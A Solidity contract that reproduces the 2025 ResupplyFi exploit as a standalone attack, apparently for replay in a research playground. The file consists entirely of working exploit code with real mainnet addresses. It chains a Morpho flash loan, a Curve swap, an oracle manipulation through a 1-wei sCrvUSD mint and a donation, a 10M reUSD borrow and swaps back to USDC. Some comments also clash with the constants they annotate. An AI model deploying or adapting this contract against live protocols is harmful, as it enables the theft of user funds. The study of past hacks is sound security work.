// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-06-ResupplyFi).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker == address(this), and the Morpho flash-loan callback
// onMorphoFlashLoan lives on the test contract itself), so there is no
// standalone exploit contract to deploy. This is a self-contained, faithful
// copy of the test's inline attack (testExploit -> onMorphoFlashLoan ->
// _swapUsdcForCrvUsd -> _manipulateOracles -> _borrowAndSwapReUSD ->
// _redeemAndFinalSwap), compiled inside the registry forge project.
// Logic and constants are copied verbatim from
// test/ResupplyFi_exp.sol.
//
// Root cause: a 4,000 USDC flash loan is used to skew the Curve
// USDC/crvUSD pool, then a tiny (1 wei) sCrvUSD mint plus a direct crvUSD
// donation to the crvUSD controller manipulates the sCrvUSD oracle used by
// ResupplyPair as collateral pricing. With an inflated 1-wei collateral
// deposit, the attacker borrows 10,000,000 reUSD against it, dumps the
// reUSD via Curve for crvUSD, redeems the (undervalued at mint time, now
// worth much more) sCrvUSD receipt back to crvUSD, and swaps everything
// back to USDC for a ~9.8M USDC profit.

interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
}

interface ICurvePool {
    function exchange(int128, int128, uint256, uint256) external;
}

interface IsCRVUSD {
    function mint(uint256) external;
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function redeem(uint256, address, address) external;
}

interface IResupplyVault {
    function addCollateralVault(uint256, address) external;
    function borrow(uint256, uint256, address) external;
}

interface IMorphoBlue {
    function flashLoan(address, uint256, bytes calldata) external;
}

contract ResupplyFiDrain {
    // Token Addresses
    IERC20 private constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant crvUsd = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IsCRVUSD private constant sCrvUsd = IsCRVUSD(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367);
    IERC20 private constant reUsd = IERC20(0x57aB1E0003F623289CD798B1824Be09a793e4Bec);

    // Contract Addresses
    IMorphoBlue private constant morphoBlue = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    ICurvePool private constant curveUsdcCrvusdPool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    IsCRVUSD private constant sCrvUsdContract = IsCRVUSD(0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D);
    IResupplyVault private constant resupplyVault = IResupplyVault(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6);
    ICurvePool private constant curveReusdPool = ICurvePool(0xc522A6606BBA746d7960404F22a3DB936B6F4F50);

    address private constant crvUSDController = 0x89707721927d7aaeeee513797A8d6cBbD0e08f41;

    // Exploit Parameters
    uint256 private constant flashLoanAmount = 4000 * 1e6; // 4,000 USDC
    uint256 private constant crvUsdTransferAmount = 2000 * 1e18; // 2,000 crvUSD
    uint256 private constant sCrvUsdMintAmount = 1;
    uint256 private constant borrowAmount = 10_000_000 * 1e18; // 10,000,000 reUSD
    uint256 private constant redeemAmount = 9_339_517.438774046 ether; // ~9,339.52 sCrvUsd
    uint256 private constant finalExchangeAmount = 9_813_732.715269934 ether; // ~9,813.73 crvUSD

    receive() external payable {}

    function run() external {
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external {
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForCrvUsd();
        _manipulateOracles();
        _borrowAndSwapReUSD();
        _redeemAndFinalSwap();
    }

    function _swapUsdcForCrvUsd() internal {
        usdc.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(0, 1, flashLoanAmount, 0);
    }

    function _manipulateOracles() internal {
        crvUsd.transfer(crvUSDController, crvUsdTransferAmount);
        crvUsd.approve(address(sCrvUsdContract), type(uint256).max);
        sCrvUsdContract.mint(sCrvUsdMintAmount);
    }

    function _borrowAndSwapReUSD() internal {
        sCrvUsdContract.approve(address(resupplyVault), type(uint256).max);
        resupplyVault.addCollateralVault(sCrvUsdMintAmount, address(this));
        resupplyVault.borrow(borrowAmount, 0, address(this));
        reUsd.approve(address(curveReusdPool), type(uint256).max);
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }

    function _redeemAndFinalSwap() internal {
        sCrvUsd.redeem(redeemAmount, address(this), address(this));
        crvUsd.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        curveUsdcCrvusdPool.exchange(1, 0, finalExchangeAmount, 0);
    }
}
